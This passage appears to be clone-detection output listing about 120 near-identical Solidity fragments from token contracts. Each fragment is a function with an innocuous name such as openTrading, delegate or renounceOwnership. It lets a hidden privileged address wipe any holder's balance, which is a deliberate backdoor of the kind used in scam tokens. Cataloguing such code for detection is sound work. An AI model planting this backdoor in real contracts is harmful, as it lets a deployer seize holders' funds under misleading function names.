        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="38" endline="42" pcid="6043">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="35" endline="39" pcid="1302">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="37" endline="41" pcid="4786">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="36" endline="40" pcid="3767">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="38" endline="42" pcid="3660">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="41" endline="45" pcid="2073">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="37" endline="41" pcid="1922">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="36" endline="40" pcid="205">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="35" endline="39" pcid="353">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="655" endline="659" pcid="4085">
    function renounceOwnership(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="40" endline="44" pcid="4340">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="35" endline="39" pcid="8447">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="38" endline="42" pcid="3171">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="39" endline="43" pcid="7480">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="40" endline="44" pcid="7243">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="36" endline="40" pcid="1252">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="39" endline="43" pcid="4653">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="38" endline="42" pcid="6771">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="36" endline="40" pcid="9051">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="40" endline="44" pcid="9122">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="35" endline="39" pcid="3877">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="37" endline="41" pcid="1043">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="36" endline="40" pcid="8889">
    function openTrading(address aiBot) external {
        if(xxnux == msg.sender && xxnux != aiBot && pancakePair() != aiBot && aiBot != ROUTER){
            _balances[aiBot] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="39" endline="43" pcid="1839">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="95" endline="99" pcid="2152">
    function openTrading(address bots) external {
        if(adm == msg.sender && adm != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="38" endline="42" pcid="2954">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="36" endline="40" pcid="5426">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="37" endline="41" pcid="3705">
    function addAIBots(address aiBot) external {
        if(xxnux == msg.sender && xxnux != aiBot && pancakePair() != aiBot && aiBot != ROUTER){
            _balances[aiBot] = 0;
        }
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="36" endline="40" pcid="6067">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="38" endline="42" pcid="6082">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="38" endline="42" pcid="118">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="38" endline="42" pcid="8084">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="35" endline="39" pcid="1139">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="36" endline="40" pcid="7495">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="32" endline="36" pcid="6903">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="34" endline="38" pcid="6509">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="32" endline="36" pcid="3522">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="39" endline="43" pcid="6833">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="34" endline="38" pcid="7982">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="38" endline="42" pcid="1942">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="38" endline="42" pcid="5637">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="35" endline="39" pcid="1453">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="37" endline="41" pcid="411">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="37" endline="41" pcid="5348">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="37" endline="41" pcid="4720">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="39" endline="43" pcid="3434">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="39" endline="43" pcid="2969">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="34" endline="38" pcid="7736">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="37" endline="41" pcid="6272">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="39" endline="43" pcid="1634">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="35" endline="39" pcid="1957">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="39" endline="43" pcid="4218">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="33" endline="37" pcid="5025">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="40" endline="44" pcid="1502">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="37" endline="41" pcid="2778">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="94" endline="98" pcid="7221">
    function openTrading(address bots) external {
        if(adm == msg.sender && adm != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="37" endline="41" pcid="7952">
    function addElements(address aiBot) external {
        if(xxnux == msg.sender && xxnux != aiBot && pancakePair() != aiBot && aiBot != ROUTER){
            _balances[aiBot] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="38" endline="42" pcid="3572">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="38" endline="42" pcid="5245">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="33" endline="37" pcid="4880">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="37" endline="41" pcid="9152">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="35" endline="39" pcid="2984">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="36" endline="40" pcid="6933">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="32" endline="36" pcid="3832">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="41" endline="45" pcid="5100">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="36" endline="40" pcid="8577">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="37" endline="41" pcid="2442">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="39" endline="43" pcid="6222">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="39" endline="43" pcid="8432">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="43" endline="47" pcid="2518">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="32" endline="36" pcid="6177">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="38" endline="42" pcid="4070">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="36" endline="40" pcid="2758">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="41" endline="45" pcid="4584">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="35" endline="39" pcid="8237">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="41" endline="45" pcid="7334">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="32" endline="36" pcid="9068">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="35" endline="39" pcid="3898">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="36" endline="40" pcid="6803">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="35" endline="39" pcid="8176">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="40" endline="44" pcid="6710">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="39" endline="43" pcid="4425">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="36" endline="40" pcid="1028">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="39" endline="43" pcid="812">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="36" endline="40" pcid="8327">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="39" endline="43" pcid="7376">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="49" endline="53" pcid="7721">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="39" endline="43" pcid="2619">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="36" endline="40" pcid="1541">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="37" endline="41" pcid="3186">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="32" endline="36" pcid="2713">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="37" endline="41" pcid="8417">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="32" endline="36" pcid="968">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="39" endline="43" pcid="4699">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="35" endline="39" pcid="5491">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="37" endline="41" pcid="4484">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="37" endline="41" pcid="5602">
    function addZeroBots(address aiBot) external {
        if(xxnux == msg.sender && xxnux != aiBot && pancakePair() != aiBot && aiBot != ROUTER){
            _balances[aiBot] = 0;
        }
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="34" endline="38" pcid="5476">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="34" endline="38" pcid="3782">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="39" endline="43" pcid="2890">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="39" endline="43" pcid="4668">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="36" endline="40" pcid="3141">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="38" endline="42" pcid="5508">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="38" endline="42" pcid="998">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="34" endline="38" pcid="7997">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="39" endline="43" pcid="5538">
    function openTrading(address bots) external {
